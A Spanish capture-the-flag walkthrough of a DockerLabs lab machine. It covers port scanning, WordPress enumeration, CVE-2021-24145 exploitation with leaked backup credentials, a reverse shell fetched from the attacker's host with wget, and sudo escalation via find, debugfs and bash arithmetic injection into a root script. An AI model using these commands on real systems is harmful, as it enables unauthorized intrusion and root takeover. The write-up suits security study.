# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c509c10c-983a-4471-8abe-c7e28044b7ae)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp (HTTP):** Apache httpd 2.4.58 (Ubuntu)
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a una pagina random.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6eda7350-7ee8-4489-a5ca-7e9ebe1ec34b)

# Fase 2- Exploración

#### Fuzzing
```python
00000241:   301        9 L      28 W       313 Ch      "wp-content"                                                                                                                               
000000786:   301        9 L      28 W       314 Ch      "wp-includes"                                                                                                                              
000007180:   301        9 L      28 W       311 Ch      "wp-admin"                                                                                                                                 
000011260:   301        9 L      28 W       310 Ch      "backups" 
```
Resultado del fuzzing.

#### WhatWeb
```python
❯ whatweb http://172.18.0.2
http://172.18.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.18.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], Script, Title[Whoiam], UncommonHeaders[link], WordPress[6.5.4]
```
Según WhatWeb esta corriendo un wordpress por esta pagina web.

#### Wpscan
```python
[i] Plugin(s) Identified:

[+] modern-events-calendar-lite
 | Location: http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/
 | Last Updated: 2022-05-10T21:06:00.000Z
 | [!] The version is out of date, the latest version is 6.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.16.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/readme.txt
 | Confirmed By: Change Log (Aggressive Detection)
 |  - http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'
```
Con wpscan listamos los plugins utilizados en la pagina y encontramos este.


# Fase 3- Explotación

#### Searchsploit
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/eba42317-7bdc-49f1-85d7-90f8e6760521)
Con Searchsploit encontramos 2 exploits posibles para esta versión. Pero en el exploit necesitamos `Usuario` y `Contraseña`.

#### Backups
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9bcdcb70-7887-4810-8f7f-691e1198cdef)
Si recordamos con fuzzing encontramos el directorio `backups`. Con un archivo. Lo descargamos.

#### databaseback2may.zip	
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3a6d4919-520f-496d-9868-cbabb4b22f72)

Descomprimimos el archivo y es un nombre de usuario y una contraseña.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6e12e3ca-c5d7-4c57-a44a-c58a92ed1969)
Y estamos dentro!

#### CVE-2021-24145
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/79bd8a6f-12ce-4228-a77c-6aab2d2e0e5c)
Encontramos un exploit en github.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/608d8efc-b0e0-4c81-805a-7602cf6adbe4)

Lo lanzamos y funciono.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d6d6e51e-6031-4f44-af63-b765ca46ad28)
Si vamos a la pagina web, tendremos una shell interactiva. Vamos a enviarnos una reverse shell desde aqui.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f7b99635-7aa5-42ff-a8e2-9143ae111b85)

Hice un archivo .php con una reverse shell y lo compartí a la maquina victima por el puerto 80, y con wget lo descargue en la maquina victima: `wget 192.168.1.2/rev.php`.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d9291072-01de-4f3b-ab32-a89fbb1876e4)

Despues de realizar el tratamiento de la TTY. Al realizar el comando `sudo -l` vemos que tenemos permisos de ejecución del binario `find` como el usuario `rafa`.

#### Binario Find
```python
www-data@96c5cb596740:/$ sudo -u rafa find . -exec /bin/sh \; -quit
$ whoami
rafa
$ 
```
Ya somos el usuario rafa.

#### sudo -l rafa
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/39c6b647-af0f-4b47-a246-c9737894c370)

Tenemos permisos de ejecución del binario `debugfs` como el usuario `ruben`.

```python
rafa@96c5cb596740:/tmp$ sudo -u ruben debugfs
debugfs 1.47.0 (5-Feb-2023)
debugfs:  !/bin/sh
$ whoami
ruben
$ 
```
Para escalar tenemos que ejecutar esos comandos. Y ya somos el usuario `ruben`.

#### sudo -l ruben
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a83bea22-05ce-4541-9dd9-45aea8fb11f8)

Como el usuario `ruben` podemos ejecutar el binario `penguin.sh` en el directorio `/opt`.
El script realiza lo siguiente:
```bash
#!/bin/bash

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```
Este script de Bash solicita al usuario ingresar un número y luego verifica si ese número es igual a 42. Si el número ingresado es igual a 42, muestra "Correcto"; de lo contrario, muestra "Incorrecto".

```python
ruben@96c5cb596740:/opt$ sudo /bin/bash /opt/penguin.sh 
Enter guess: a[$(whoami>&2)]+42
root
Correct
```
Logre inyectar un comando como usuario root con el script.

```python
ruben@96c5cb596740:/opt$ sudo /bin/bash /opt/penguin.sh 
Enter guess: a[$(/bin/bash>&2)]+42 
root@96c5cb596740:/opt# whoami
root
root@96c5cb596740:/opt# 
```
Y logramos escalar. Somos root!
